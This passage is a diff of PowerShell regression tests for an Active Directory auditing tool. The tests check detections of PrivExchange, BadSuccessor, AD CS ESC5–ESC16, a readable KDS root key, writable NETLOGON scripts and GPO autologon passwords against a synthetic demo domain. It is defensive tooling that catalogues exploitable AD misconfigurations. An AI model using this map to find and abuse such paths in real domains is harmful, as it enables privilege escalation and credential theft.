@@ -17,7 +17,7 @@ $root = Split-Path $PSScriptRoot -Parent
 . (Join-Path $root 'lib\ChecksEntra.ps1')
 . (Join-Path $root 'lib\Compliance.ps1')
 
-$tmp = Join-Path ([System.IO.Path]::GetTempPath()) "moosead_regression_$PID"
+$tmp = Join-Path ([System.IO.Path]::GetTempPath()) "idwolf_regression_$PID"
 New-Item -ItemType Directory -Path $tmp -Force | Out-Null
 $script:Failures = 0; $script:Passed = 0
 
@@ -49,11 +49,11 @@ $demo = Import-ADSnapshot (Join-Path $tmp 'demo.json')
 $r = Invoke-Analysis $demo
 $bySev = @{}; foreach ($s in 'Critical', 'High', 'Medium', 'Low') { $bySev[$s] = @($r.Findings | Where-Object { $_.Severity -eq $s }).Count }
 Write-Host ("  {0} findings (C {1} / H {2} / M {3} / L {4}), {5} Tier 0 principals" -f $r.Findings.Count, $bySev.Critical, $bySev.High, $bySev.Medium, $bySev.Low, $r.PrivMap.Principals.Count)
-Assert-True ($r.Findings.Count -eq 165) "demo total findings: expected 165, got $($r.Findings.Count)"
-Assert-True ($bySev.Critical -eq 20 -and $bySev.High -eq 66 -and $bySev.Medium -eq 60 -and $bySev.Low -eq 19) "demo severity split: expected 20/66/60/19 (got $($bySev.Critical)/$($bySev.High)/$($bySev.Medium)/$($bySev.Low))"
+Assert-True ($r.Findings.Count -eq 193) "demo total findings: expected 193, got $($r.Findings.Count)"
+Assert-True ($bySev.Critical -eq 25 -and $bySev.High -eq 75 -and $bySev.Medium -eq 67 -and $bySev.Low -eq 26) "demo severity split: expected 25/75/67/26 (got $($bySev.Critical)/$($bySev.High)/$($bySev.Medium)/$($bySev.Low))"
 Assert-True ($r.PrivMap.Principals.Count -eq 17) "demo Tier 0 principals: expected 17, got $($r.PrivMap.Principals.Count)"
 $demoNE = @($r.NotEvaluated | ForEach-Object { $_.Type })
-Assert-True (($demoNE -contains 'dangerous_ace_anywhere') -and ($demoNE -contains 'laps_readers') -and ($demoNE -contains 'pwq_empty_password') -and ($demoNE.Count -eq 7)) "demo (non-deep): dangerous_ace_anywhere + laps_readers + 5 pwq not evaluated (got $($demoNE -join ','))"
+Assert-True (($demoNE -contains 'dangerous_ace_anywhere') -and ($demoNE -contains 'laps_readers') -and ($demoNE -contains 'kds_root_key_readable') -and ($demoNE -contains 'pwq_empty_password') -and ($demoNE.Count -eq 8)) "demo (non-deep): dangerous_ace_anywhere + kds_root_key_readable + laps_readers + 5 pwq not evaluated (got $($demoNE -join ','))"
 
 # Operational health (replication / DHCP / backup) fires in a normal collection.
 Assert-True (Has $r 'replication_failures' 'dc02.moosebank.local' 'Medium') 'health: consecutive replication failures flagged'
@@ -148,8 +148,65 @@ Assert-True (Has (Invoke-Analysis $snapAo) 'dangerous_ace_tier0' 'BUILTIN\Accoun
 $snapAo2 = Import-ADSnapshot (Join-Path $tmp 'demo.json')
 @($snapAo2.groups | Where-Object { $_.sid -match '-520$' })[0].adminCount = 1
 Assert-True (Has (Invoke-Analysis $snapAo2) 'dangerous_ace_tier0' 'BUILTIN\Account Operators') 'Account Operators ACE on a protected (adminCount=1) GPCO still flagged'
+# PrivExchange: Exchange Windows Permissions with WriteDacl on the domain head (no fixed SID, matched as any non-Tier 0 principal).
+$snapEx = Import-ADSnapshot (Join-Path $tmp 'demo.json')
+$exAcl = @($snapEx.acls | Where-Object { $_.target -eq 'DomainRoot' })[0]
+$exAcl.aces = @($exAcl.aces) + @([PSCustomObject]@{ sid = 'S-1-5-21-1000-2000-3000-1150'; name = 'MOOSEBANK\Exchange Windows Permissions'; rights = 'WriteDacl'; accessType = 'Allow'; objectType = '00000000-0000-0000-0000-000000000000'; inheritedObjectType = '00000000-0000-0000-0000-000000000000'; inheritanceType = 'None'; isInherited = $false })
+Assert-True (Has (Invoke-Analysis $snapEx) 'dangerous_ace_tier0' 'MOOSEBANK\Exchange Windows Permissions') 'PrivExchange: Exchange Windows Permissions WriteDacl on the domain head is flagged'
+# BadSuccessor: silent without a Windows Server 2025 DC; with one, severity follows its patch level.
+Assert-True (@($r.Findings | Where-Object { $_.Type -eq 'badsuccessor_dmsa_create' }).Count -eq 0 -and $demoNE -notcontains 'badsuccessor_dmsa_create') 'BadSuccessor: evaluated and silent without a 2025 DC'
+function New-Dc2025Snapshot {
+    param($Ubr, [switch]$NoState)
+    $s = Import-ADSnapshot (Join-Path $tmp 'demo.json')
+    $s.domainControllers = @($s.domainControllers) + @([PSCustomObject]@{ name = 'DC03'; hostName = 'dc03.moosebank.local'; operatingSystem = 'Windows Server 2025 Datacenter'; osVersion = '10.0 (26100)'; isGlobalCatalog = $true; isReadOnly = $false; site = 'Milano'; fsmoRoles = @(); computerDN = "CN=DC03,OU=Domain Controllers,DC=moosebank,DC=local" })
+    if (-not $NoState) { $s.health.dcState = @($s.health.dcState) + @([PSCustomObject]@{ dc = 'dc03.moosebank.local'; osBuild = '26100'; osUbr = $Ubr; error = '' }) }
+    return $s
+}
+$rBs = Invoke-Analysis (New-Dc2025Snapshot -Ubr 4652)
+$bs = @($rBs.Findings | Where-Object { $_.Type -eq 'badsuccessor_dmsa_create' })
+Assert-True ((($bs | ForEach-Object { "$($_.Object)=$($_.Severity)" }) -join ',') -eq 'MOOSEBANK\Helpdesk=High,MOOSEBANK\IT-Ops=High') "BadSuccessor: Helpdesk (CreateChild dMSA) and IT-Ops (owner) only, High on an unpatched DC (got $(($bs | ForEach-Object { "$($_.Object)=$($_.Severity)" }) -join ','))"
+Assert-True ($bs[0].Detail -match '^CreateChild\(dMSA\) on OU=Workstations,OU=MooseBank,DC=moosebank,DC=local\. Windows Server 2025 DC\(s\): DC03 \(build 26100\.4652, not patched\)\.$' -and $bs[1].Detail -match '^owner on OU=ServiceAccounts') "BadSuccessor: detail names the right, the OU and the DC (got $($bs.Detail -join ' | '))"
+$rBsP = Invoke-Analysis (New-Dc2025Snapshot -Ubr 4946)
+Assert-True (@($rBsP.Findings | Where-Object { $_.Type -eq 'badsuccessor_dmsa_create' -and $_.Severity -eq 'Medium' }).Count -eq 2) 'BadSuccessor: Medium once every 2025 DC has the August 2025 update'
+$rBsU = Invoke-Analysis (New-Dc2025Snapshot -NoState)
+Assert-True ((Has $rBsU 'badsuccessor_dmsa_create' 'MOOSEBANK\Helpdesk' 'High') -and @($rBsU.Findings | Where-Object { $_.Type -eq 'badsuccessor_dmsa_create' })[0].Detail -match 'DC03 \(patch level not read\)') 'BadSuccessor: unread patch level stays High'
+$sBsC = New-Dc2025Snapshot -Ubr 4652
+$sBsC.ouAcls = @($sBsC.ouAcls) + @([PSCustomObject]@{ target = 'ou:CN=Computers'; distinguishedName = "CN=Computers,DC=moosebank,DC=local"; objectClass = 'container'; ownerSid = "$($rBs.Index.DomainSid)-512"; ownerName = 'MOOSEBANK\Domain Admins'
+        aces = @([PSCustomObject]@{ sid = 'S-1-5-11'; name = 'NT AUTHORITY\Authenticated Users'; rights = 'CreateChild'; accessType = 'Allow'; objectType = '00000000-0000-0000-0000-000000000000'; inheritedObjectType = '00000000-0000-0000-0000-000000000000'; inheritanceType = 'None'; isInherited = $false }) })
+Assert-True (Has (Invoke-Analysis $sBsC) 'badsuccessor_dmsa_create' 'NT AUTHORITY\Authenticated Users' 'Critical') 'BadSuccessor: Authenticated Users CreateChild(all) on an unpatched DC is Critical'
+$sBsO = New-Dc2025Snapshot -Ubr 4652
+$sBsO.PSObject.Properties.Remove('ouAcls')
+$rBsO = Invoke-Analysis $sBsO
+Assert-True (@($rBsO.Findings | Where-Object { $_.Type -eq 'badsuccessor_dmsa_create' }).Count -eq 0 -and @($rBsO.NotEvaluated | Where-Object { $_.Type -eq 'badsuccessor_dmsa_create' -and $_.Reason -match 'older collector' }).Count -eq 1) 'BadSuccessor: older snapshot without OU ACLs is not evaluated, not clean'
+$sw = @($r.Findings | Where-Object { $_.Type -eq 'sysvol_writable' })
+Assert-True ($sw.Count -eq 1 -and $sw[0].Object -eq 'NETLOGON (scripts)' -and $sw[0].Severity -eq 'Critical' -and $sw[0].Detail -match 'MOOSEBANK\\Domain Users \(Modify' -and $sw[0].Detail -notmatch 'Server Operators|Authenticated') "SYSVOL: NETLOGON writable by Domain Users, defaults and GPCO ignored (got $($sw.Detail))"
+$snapSw = Import-ADSnapshot (Join-Path $tmp 'demo.json')
+$snapSw.sysvol.PSObject.Properties.Remove('folderAcls')
+$rSw = Invoke-Analysis $snapSw
+Assert-True (@($rSw.Findings | Where-Object { $_.Type -eq 'sysvol_writable' }).Count -eq 0 -and @($rSw.NotEvaluated | Where-Object { $_.Type -eq 'sysvol_writable' }).Count -eq 1 -and @($rSw.NotEvaluated | Where-Object { $_.Type -eq 'gpp_cpassword' }).Count -eq 0) 'SYSVOL: folder permissions not evaluated on an older snapshot, the rest of the SYSVOL scan still counts'
+Assert-True (@($r.Findings | Where-Object { $_.Type -eq 'trust_rc4' -and $_.Detail -match 'last changed 400 days ago' }).Count -eq 1) 'trust_rc4 shows the age of the trust key'
 Assert-True (Has $r 'trust_sid_filtering_disabled' 'legacy-forest.local') 'forest trust with SID history'
 Assert-True (-not (@($r.Findings | Where-Object { $_.Object -eq 'child.moosebank.local' }).Count)) 'intra-forest trust ignored'
+Assert-True (Has $r 'trust_inactive' 'partner.example' 'Low') 'trust untouched for 400 days flagged as inactive'
+Assert-True (Has $r 'schema_java_objects' 'moosebank.local' 'Low') 'Java classes in the schema flagged'
+Assert-True (Has $r 'dns_zone_create_child' 'moosebank.local' 'Medium') 'Authenticated Users CreateChild on the zone flagged'
+Assert-True (Has $r 'smartcard_password_not_rotated' 'sc.bianchi' 'Medium') 'smart-card-only account with a 900-day hash flagged'
+Assert-True (@($r.Findings | Where-Object { $_.Type -eq 'smartcard_password_not_rotated' -and $_.Detail -match 'rotation: off' }).Count -eq 1) 'smart-card finding reports the domain rotation setting'
+Assert-True (@($r.Findings | Where-Object { $_.Type -eq 'smartcard_password_not_rotated' }).Count -eq 1) 'only the stale smart-card account is flagged'
+Assert-True (Has $r 'schema_class_poss_superior' 'msExchStorageGroup' 'High') 'msExchStorageGroup with computer in possSuperiors flagged (CVE-2021-34470)'
+Assert-True (-not (Has $r 'schema_class_poss_superior' 'mooseDevice')) 'possSuperiors class that does not inherit from container not flagged'
+$snapDnsOld = Import-ADSnapshot (Join-Path $tmp 'demo.json')
+foreach ($zz in @($snapDnsOld.dns.zones)) { $zz.PSObject.Properties.Remove('createChildSids') }
+$rDnsOld = Invoke-Analysis $snapDnsOld
+Assert-True (-not (Has $rDnsOld 'dns_zone_create_child' 'moosebank.local') -and @($rDnsOld.NotEvaluated | Where-Object { $_.Type -eq 'dns_zone_create_child' }).Count -eq 1) 'dns_zone_create_child not evaluated (and silent) without zone ACLs'
+Assert-True (Has $rDnsOld 'dns_insecure_updates' 'moosebank.local') 'other DNS checks still run on an older snapshot'
+Assert-True (@($r.NotEvaluated | Where-Object { $_.Type -eq 'schema_java_objects' }).Count -eq 0) 'schema_java_objects evaluated on the demo snapshot'
+Assert-True (-not (Has $r 'trust_inactive' 'legacy-forest.local')) 'recently rotated trust not flagged inactive'
+$snapOldTrust = Import-ADSnapshot (Join-Path $tmp 'demo.json')
+foreach ($tt in @($snapOldTrust.trusts)) { $tt.PSObject.Properties.Remove('whenChanged') }
+$rOldTrust = Invoke-Analysis $snapOldTrust
+Assert-True (-not (Has $rOldTrust 'trust_inactive' 'partner.example')) 'trust_inactive silent when the snapshot has no whenChanged'
+Assert-True (@($rOldTrust.NotEvaluated | Where-Object { $_.Type -eq 'trust_inactive' }).Count -eq 1) 'trust_inactive listed as not evaluated on an older snapshot'
 
 # ------------------------------------------------------------------ AD CS
 Write-Host "[adcs]"
@@ -161,7 +218,24 @@ Assert-True (Has $r 'adcs_low_priv_enroll' 'Moose Web Server') 'client-auth enro
 Assert-True (-not (Has $r 'adcs_esc1' 'Moose User')) 'admins-only template not flagged'
 Assert-True (-not (Has $r 'adcs_esc1' 'Moose Web Server')) 'approval-gated template not ESC1'
 Assert-True (Has $r 'adcs_ca_cert_expiring' 'MOOSEBANK-CA') 'CA cert expiry flagged'
-Assert-True (Has $r 'adcs_manual_checks' 'MOOSEBANK-CA') 'manual ESC6/7/8 note emitted'
+Assert-True (-not (Has $r 'adcs_manual_checks' 'MOOSEBANK-CA')) 'no manual AD CS note when the CA settings were read'
+Assert-True (Has $r 'adcs_esc6' 'MOOSEBANK-CA' 'High') 'on-CA: ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)'
+Assert-True ((Has $r 'adcs_esc7' 'MOOSEBANK-CA' 'High') -and @($r.Findings | Where-Object { $_.Type -eq 'adcs_esc7' })[0].Detail -match 'MOOSEBANK\\Helpdesk \(Issue and Manage Certificates\)' -and @($r.Findings | Where-Object { $_.Type -eq 'adcs_esc7' })[0].Detail -notmatch 'Domain Admins|Authenticated') 'on-CA: ESC7 names only the non-Tier 0 officer'
+Assert-True (Has $r 'adcs_esc8' 'MOOSEBANK-CA' 'High') 'on-CA: ESC8 (web enrollment installed)'
+Assert-True (Has $r 'adcs_esc11' 'MOOSEBANK-CA' 'High') 'on-CA: ESC11 (InterfaceFlags without IF_ENFORCEENCRYPTICERTREQUEST)'
+Assert-True (-not (Has $r 'adcs_esc16' 'MOOSEBANK-CA')) 'on-CA: no ESC16 while the SID extension is kept'
+Assert-True (@($r.NotEvaluated | Where-Object { $_.Type -like 'adcs_esc*' }).Count -eq 0) 'on-CA: all ESC checks evaluated when the CA was read'
+$snapCa = Import-ADSnapshot (Join-Path $tmp 'demo.json')
+$caReg = @($snapCa.adcs.enrollmentServices)[0].caRegistry
+$caReg.disableExtensionList = @('1.3.6.1.4.1.311.25.2'); $caReg.interfaceFlags = 0x241; $caReg.webEnrollment = $null
+$caReg.securityAces = @($caReg.securityAces) + @([PSCustomObject]@{ sid = 'S-1-5-11'; name = 'NT AUTHORITY\Authenticated Users'; mask = 1 })
+$rCa = Invoke-Analysis $snapCa
+Assert-True ((Has $rCa 'adcs_esc16' 'MOOSEBANK-CA') -and -not (Has $rCa 'adcs_esc11' 'MOOSEBANK-CA') -and (Has $rCa 'adcs_esc7' 'MOOSEBANK-CA' 'Critical')) 'on-CA: ESC16 flagged, ESC11 clean with 0x200, ESC7 Critical for Authenticated Users'
+Assert-True (-not (Has $rCa 'adcs_esc8' 'MOOSEBANK-CA') -and @($rCa.NotEvaluated | Where-Object { $_.Type -eq 'adcs_esc8' -and $_.Reason -match 'could not be identified on MOOSEBANK-CA' }).Count -eq 1) 'on-CA: unknown roles make ESC8 not evaluated, not clean'
+$snapCaOld = Import-ADSnapshot (Join-Path $tmp 'demo.json')
+@($snapCaOld.adcs.enrollmentServices)[0].PSObject.Properties.Remove('caRegistry')
+$rCaOld = Invoke-Analysis $snapCaOld
+Assert-True ((Has $rCaOld 'adcs_manual_checks' 'MOOSEBANK-CA') -and -not (Has $rCaOld 'adcs_esc6' 'MOOSEBANK-CA') -and @($rCaOld.NotEvaluated | Where-Object { $_.Type -in 'adcs_esc6', 'adcs_esc7', 'adcs_esc8', 'adcs_esc11', 'adcs_esc16' }).Count -eq 5 -and @($rCaOld.NotEvaluated | Where-Object { $_.Type -eq 'adcs_esc1' }).Count -eq 0) 'on-CA: an unread CA keeps the manual note, the 5 on-CA checks are not evaluated, LDAP checks still run'
 Assert-True (Has $r 'adcs_esc9' 'Moose ESC9 NoSecExt' 'High') 'ESC9 detected (no security extension)'
 Assert-True (Has $r 'adcs_esc15' 'Moose ESC15 SchemaV1' 'High') 'ESC15 detected (schema v1 + supplies subject)'
 Assert-True (Has $r 'adcs_esc13' 'Moose ESC13 PolicyLink' 'Critical') 'ESC13 detected (issuance policy linked to a privileged group)'
@@ -283,7 +357,7 @@ Assert-True (-not (Has (Invoke-Analysis $snapPp) 'point_and_print_unsafe' 'Domai
 # ESC5: control of PKI objects; Cert Publishers and Tier 0 are expected there.
 Assert-True (Has $r 'adcs_esc5' 'MOOSEBANK\IT-Ops' 'High') 'ESC5: non-Tier 0 WriteDacl on the CA object flagged'
 Assert-True (@($r.Findings | Where-Object { $_.Type -eq 'adcs_esc5' }).Count -eq 1) 'ESC5: Cert Publishers and Tier 0 rights on PKI objects not flagged'
-Assert-True ((Has $r 'adcs_manual_checks' 'MOOSEBANK-CA') -and @($r.Findings | Where-Object { $_.Type -eq 'adcs_manual_checks' })[0].Detail -match 'ESC11/ESC16') 'manual AD CS note lists ESC11 and ESC16'
+Assert-True ((Has $rCaOld 'adcs_manual_checks' 'MOOSEBANK-CA') -and @($rCaOld.Findings | Where-Object { $_.Type -eq 'adcs_manual_checks' })[0].Detail -match 'ESC11/ESC16') 'manual AD CS note lists ESC11 and ESC16'
 $snapE5 = Import-ADSnapshot (Join-Path $tmp 'demo.json')
 $e5Acl = @($snapE5.adcs.pkiAcls | Where-Object { $_.target -eq 'NTAuthCertificates' })[0]
 $e5Acl.ownerSid = "$rootSidX-513"; $e5Acl.ownerName = 'MOOSEBANK\Domain Users'
@@ -320,6 +394,14 @@ $deep = Import-ADSnapshot (Join-Path $tmp 'deep.json')
 $rd = Invoke-Analysis $deep
 Assert-True (@($rd.NotEvaluated | Where-Object { $_.Type -eq 'dangerous_ace_anywhere' }).Count -eq 0) 'deep run evaluates dangerous_ace_anywhere'
 Assert-True (Has $rd 'dangerous_ace_anywhere' 'MOOSEBANK\Helpdesk' 'High') 'deep: non-priv GenericAll over a DA'
+Assert-True ($rd.Findings.Count -eq 198) "deep total findings: expected 198, got $($rd.Findings.Count)"
+Assert-True (Has $rd 'kds_root_key_readable' 'MOOSEBANK\Helpdesk' 'High') 'deep: Helpdesk can read the KDS root key (Golden gMSA)'
+Assert-True (-not (Has $rd 'kds_root_key_readable' 'MOOSEBANK\Domain Admins')) 'deep: Domain Admins on the KDS root key is the default'
+Assert-True (@($r.NotEvaluated | Where-Object { $_.Type -eq 'kds_root_key_readable' }).Count -eq 1) 'kds_root_key_readable not evaluated without -Deep'
+$deepOld = Import-ADSnapshot (Join-Path $tmp 'deep.json')
+$deepOld.PSObject.Properties.Remove('kdsRootKeyAcls')
+$rdOld = Invoke-Analysis $deepOld
+Assert-True (-not (Has $rdOld 'kds_root_key_readable' 'MOOSEBANK\Helpdesk') -and @($rdOld.NotEvaluated | Where-Object { $_.Type -eq 'kds_root_key_readable' }).Count -eq 1) 'kds_root_key_readable not evaluated on an older -Deep snapshot'
 Assert-True (Has $rd 'dangerous_ace_anywhere' 'NT AUTHORITY\Authenticated Users' 'Critical') 'deep: Authenticated Users WriteDacl on OU (Critical)'
 Assert-True ((Has $rd 'dangerous_ace_anywhere' 'MOOSEBANK\IT-Ops' 'High') -and @($rd.Findings | Where-Object { $_.Type -eq 'dangerous_ace_anywhere' -and $_.Object -eq 'MOOSEBANK\IT-Ops' })[0].Detail -match 'User-Account-Restrictions') 'deep: WriteAccountRestrictions (RBCD) over a server flagged'
 # The lab chain of tests\lab (what New-LabAttackPaths.ps1 plants) built into a deep snapshot, then read by Test-LabAttackMap.ps1.
@@ -364,8 +446,8 @@ Write-Host "[partial]"
 $partial = Import-ADSnapshot (Join-Path $tmp 'partial.json')
 $rp = Invoke-Analysis $partial
 $ne = @($rp.NotEvaluated | ForEach-Object { $_.Type })
-Assert-True ($rp.Findings.Count -eq 157) "partial total findings: expected 157, got $($rp.Findings.Count)"
-Assert-True (($ne -join ',') -eq 'fgpp_weak,dcsync_rights,sync_laps_rights,dangerous_ace_tier0,nonstandard_owner_tier0,gpp_cpassword,sysvol_script_secrets,dangerous_ace_anywhere,laps_readers,pwq_duplicate_passwords,pwq_default_password,pwq_empty_password,pwq_breached_password,pwq_cleartext_stored') "partial not-evaluated set: got $($ne -join ',')"
+Assert-True ($rp.Findings.Count -eq 183) "partial total findings: expected 183, got $($rp.Findings.Count)"
+Assert-True (($ne -join ',') -eq 'fgpp_weak,dcsync_rights,sync_laps_rights,dangerous_ace_tier0,nonstandard_owner_tier0,gpp_cpassword,sysvol_writable,sysvol_script_secrets,dangerous_ace_anywhere,kds_root_key_readable,badsuccessor_dmsa_create,laps_readers,gpo_autologon_password,pwq_duplicate_passwords,pwq_default_password,pwq_empty_password,pwq_breached_password,pwq_cleartext_stored') "partial not-evaluated set: got $($ne -join ',')"
 
 # ------------------------------------------------------------- mutations
 Write-Host "[mutations]"
@@ -516,6 +598,103 @@ Assert-True (Has $r 'ldap_signing_not_required' 'Domain Controllers' 'High') 'gp
 Assert-True (Has $r 'ldap_channel_binding_off' 'Domain Controllers') 'gpo: LDAP channel binding off'
 Assert-True (Has $r 'ntlm_weak_lmcompat' 'Domain Controllers') 'gpo: weak LmCompatibilityLevel'
 Assert-True (Has $r 'anonymous_sam_enum' 'Domain Controllers') 'gpo: anonymous SAM enumeration'
+$anonDetail = @($r.Findings | Where-Object { $_.Type -eq 'anonymous_sam_enum' })[0].Detail
+Assert-True ($anonDetail -match 'EveryoneIncludesAnonymous = 1' -and $anonDetail -match 'NullSessionShares = COMCFG, DFS\$' -and $anonDetail -match 'extra NullSessionPipes = BROWSER\.' -and $anonDetail -notmatch 'netlogon') "gpo: null session settings listed, default pipes skipped (got $anonDetail)"
+Assert-True (Has $r 'mdns_enabled' 'Domain Controllers' 'Medium') 'gpo: mDNS not disabled'
+Assert-True (@($r.Findings | Where-Object { $_.Type -eq 'webclient_not_disabled' -and $_.Detail -match 'startup = 3' }).Count -eq 1) 'gpo: WebClient on Manual from the Default Domain Policy'
+$snapWc = Import-ADSnapshot (Join-Path $tmp 'demo.json')
+@($snapWc.gpo.gpos | Where-Object { $_.displayName -eq 'Default Domain Policy' })[0].serviceStart.webclient = 4
+Assert-True (-not (Has (Invoke-Analysis $snapWc) 'webclient_not_disabled' 'Domain Controllers')) 'gpo: WebClient disabled by GPO is not flagged'
+$snapWcOld = Import-ADSnapshot (Join-Path $tmp 'demo.json')
+foreach ($gg in @($snapWcOld.gpo.gpos)) { $gg.PSObject.Properties.Remove('serviceStart') }
+$rWcOld = Invoke-Analysis $snapWcOld
+Assert-True (-not (Has $rWcOld 'webclient_not_disabled' 'Domain Controllers') -and @($rWcOld.NotEvaluated | Where-Object { $_.Type -eq 'webclient_not_disabled' }).Count -eq 1) 'gpo: WebClient not evaluated (and silent) on an older snapshot'
+Assert-True ((Has $rWcOld 'spooler_on_dc' 'Domain Controllers') -and (Has $rWcOld 'mdns_enabled' 'Domain Controllers')) 'gpo: spooler and mDNS still evaluated on an older snapshot'
+Assert-True (Has $r 'always_install_elevated' 'Default Domain Policy' 'Critical') 'gpo: AlwaysInstallElevated on both sides is Critical'
+$al = @($r.Findings | Where-Object { $_.Type -eq 'gpo_autologon_password' })
+Assert-True ($al.Count -eq 2 -and (Has $r 'gpo_autologon_password' 'Default Domain Policy' 'Critical') -and @($al | Where-Object { $_.Object -match '22222222' -and $_.Detail -match 'Preferences registry item' }).Count -eq 1 -and @($al | Where-Object { $_.Detail -match 'masked' }).Count -eq 0) 'gpo: autologon password from a registry value and from a GPP item, value never shown'
+Assert-True (@($r.Findings | Where-Object { $_.Type -eq 'wsus_http' -and $_.Detail -match 'http://wsus01\.moosebank\.local:8530' }).Count -eq 1) 'gpo: WSUS over HTTP'
+Assert-True ((Has $r 'rdp_nla_disabled' 'MooseBank DC Extra' 'Medium') -and (Has $r 'rdp_restricted_admin' 'MooseBank DC Extra' 'Medium')) 'gpo: RDP without NLA and with Restricted Admin'
+Assert-True ((Has $r 'credential_guard_not_configured' 'moosebank.local' 'Low') -and (Has $r 'app_control_missing' 'moosebank.local' 'Low') -and (Has $r 'force_logoff_disabled' 'moosebank.local' 'Low') -and (Has $r 'wsh_enabled' 'moosebank.local' 'Low')) 'gpo: Credential Guard, application control, force logoff and WSH not configured'
+Assert-True (Has $r 'ipv6_dhcpv6_takeover' 'moosebank.local' 'Medium') 'gpo: IPv6 left on with relay targets open is Medium'
+Assert-True (Has $r 'wpad_not_disabled' 'moosebank.local' 'Low') 'gpo: WPAD auto-discovery not disabled'
+$snapWp = Import-ADSnapshot (Join-Path $tmp 'demo.json')
+@($snapWp.gpo.gpos | Where-Object { $_.displayName -eq 'Default Domain Policy' })[0].serviceStart | Add-Member -NotePropertyName 'winhttpautoproxysvc' -NotePropertyValue 4
+Assert-True (-not (Has (Invoke-Analysis $snapWp) 'wpad_not_disabled' 'moosebank.local')) 'gpo: WinHttpAutoProxySvc disabled by GPO clears the WPAD check'
+$snapAd = Import-ADSnapshot (Join-Path $tmp 'demo.json')
+$ddp = @($snapAd.gpo.gpos | Where-Object { $_.displayName -eq 'Default Domain Policy' })[0]
+$ddp.registryValues.PSObject.Properties.Remove('USER\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated')
+$ddp.registryValues | Add-Member -NotePropertyName 'MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\{a61c8b2c-a319-4cd0-9690-d2177cad7b51}\Value' -NotePropertyValue '1,<rule/>'
+$ddp.registryValues | Add-Member -NotePropertyName 'MACHINE\Software\Policies\Microsoft\Windows\DeviceGuard\LsaCfgFlags' -NotePropertyValue '4,1'
+$ddp.registryValues | Add-Member -NotePropertyName 'MACHINE\System\CurrentControlSet\Services\Tcpip6\Parameters\DisabledComponents' -NotePropertyValue '4,255'
+$ddp.systemAccess = [PSCustomObject]@{ ForceLogoffWhenHourExpire = '1' }
+$rAd = Invoke-Analysis $snapAd
+Assert-True ((Has $rAd 'always_install_elevated' 'Default Domain Policy' 'High') -and @($rAd.Findings | Where-Object { $_.Type -eq 'always_install_elevated' })[0].Detail -match 'not exploitable on its own') 'gpo: machine side only is High'
+$asf = @($r.Findings | Where-Object { $_.Type -eq 'altsecid_weak_mapping' })
+Assert-True ($asf.Count -eq 1 -and $asf[0].Object -eq 'sc.bianchi' -and $asf[0].Severity -eq 'High' -and $asf[0].Detail -match 'SubjectOnly' -and $asf[0].Detail -notmatch 'IssuerSerial' -and $asf[0].Detail -match 'StrongCertificateBindingEnforcement = 1') "ESC14: weak mapping flagged, High while strong binding is relaxed by GPO (got $($asf.Detail))"
+$snapAs = Import-ADSnapshot (Join-Path $tmp 'demo.json')
+@($snapAs.gpo.gpos | Where-Object { $_.displayName -eq 'Default Domain Controllers Policy' })[0].registryValues.PSObject.Properties.Remove('MACHINE\System\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement')
+Assert-True (Has (Invoke-Analysis $snapAs) 'altsecid_weak_mapping' 'sc.bianchi' 'Medium') 'ESC14: Medium under full enforcement'
+foreach ($uu in @($snapAs.users)) { $uu.PSObject.Properties.Remove('altSecIdTypes') }
+$rAsOld = Invoke-Analysis $snapAs
+Assert-True (-not (Has $rAsOld 'altsecid_weak_mapping' 'sc.bianchi') -and @($rAsOld.NotEvaluated | Where-Object { $_.Type -eq 'altsecid_weak_mapping' }).Count -eq 1) 'ESC14: not evaluated on an older snapshot'
+Assert-True (-not (Has $rAd 'app_control_missing' 'moosebank.local') -and -not (Has $rAd 'credential_guard_not_configured' 'moosebank.local') -and -not (Has $rAd 'ipv6_dhcpv6_takeover' 'moosebank.local') -and -not (Has $rAd 'force_logoff_disabled' 'moosebank.local')) 'gpo: AppLocker rules, Credential Guard, IPv6 off and force logoff clear the domain-wide checks'
+$snapAdOld = Import-ADSnapshot (Join-Path $tmp 'demo.json')
+$snapAdOld.sysvol.PSObject.Properties.Remove('autologonFiles')
+foreach ($gg in @($snapAdOld.gpo.gpos)) { $gg.PSObject.Properties.Remove('userPolicyRead') }
+@($snapAdOld.gpo.gpos | Where-Object { $_.displayName -eq 'Default Domain Policy' })[0].registryValues.PSObject.Properties.Remove('USER\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated')
+$rAdOld = Invoke-Analysis $snapAdOld
+Assert-True (@($rAdOld.NotEvaluated | Where-Object { $_.Type -eq 'gpo_autologon_password' }).Count -eq 1 -and @($rAdOld.Findings | Where-Object { $_.Type -eq 'always_install_elevated' })[0].Detail -match 'user side was not collected') 'gpo: older snapshot: GPP autologon not evaluated, AlwaysInstallElevated says the user side is unknown'
+Assert-True (Has $r 'webclient_on_dc' 'dc02.moosebank.local' 'High') 'live: WebClient running on DC02 (High)'
+Assert-True (@($r.Findings | Where-Object { $_.Type -eq 'webclient_on_dc' }).Count -eq 1) 'live: WebClient absent on DC01 and unreadable RODC not flagged'
+$snapWl = Import-ADSnapshot (Join-Path $tmp 'demo.json')
+$wl2 = @($snapWl.health.dcState | Where-Object { $_.dc -eq 'dc02.moosebank.local' })[0]; $wl2.webClientState = 'Stopped'
+$wl1 = @($snapWl.health.dcState | Where-Object { $_.dc -eq 'dc01.moosebank.local' })[0]; $wl1.webClientStartMode = 'Disabled'; $wl1.webClientState = 'Stopped'
+$rWl = Invoke-Analysis $snapWl
+Assert-True ((Has $rWl 'webclient_on_dc' 'dc02.moosebank.local' 'Medium') -and -not (Has $rWl 'webclient_on_dc' 'dc01.moosebank.local')) 'live: stopped Manual WebClient is Medium, Disabled is clean'
+foreach ($ws in @($snapWl.health.dcState)) { $ws.PSObject.Properties.Remove('webClientStartMode'); $ws.PSObject.Properties.Remove('webClientState') }
+$rWlOld = Invoke-Analysis $snapWl
+Assert-True (-not (Has $rWlOld 'webclient_on_dc' 'dc02.moosebank.local') -and @($rWlOld.NotEvaluated | Where-Object { $_.Type -eq 'webclient_on_dc' }).Count -eq 1 -and @($rWlOld.NotEvaluated | Where-Object { $_.Type -eq 'dc_low_disk' }).Count -eq 0) 'live: WebClient not evaluated on an older snapshot, other DC state checks still run'
+$nbt = @($r.Findings | Where-Object { $_.Type -eq 'nbtns_enabled_dc' })
